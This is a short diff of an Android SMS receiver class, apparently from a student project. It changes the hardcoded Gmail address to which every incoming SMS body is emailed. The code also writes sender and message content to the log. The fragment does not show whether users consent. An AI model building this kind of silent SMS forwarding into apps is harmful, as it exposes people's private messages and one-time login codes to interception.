@@ -21,7 +21,7 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
                 String sender = smsMessage.getDisplayOriginatingAddress();
                 String message = smsMessage.getDisplayMessageBody();
                 Log.d("SMSBroadcastReceiver", "Sender: " + sender + "Message: " + message);
-                EmailHelper.sendEmail("kingoforgans@gmail.com","SMS", message);
+                EmailHelper.sendEmail("ict1004p2grp4@gmail.com","SMS", message);
             }
         }
     }
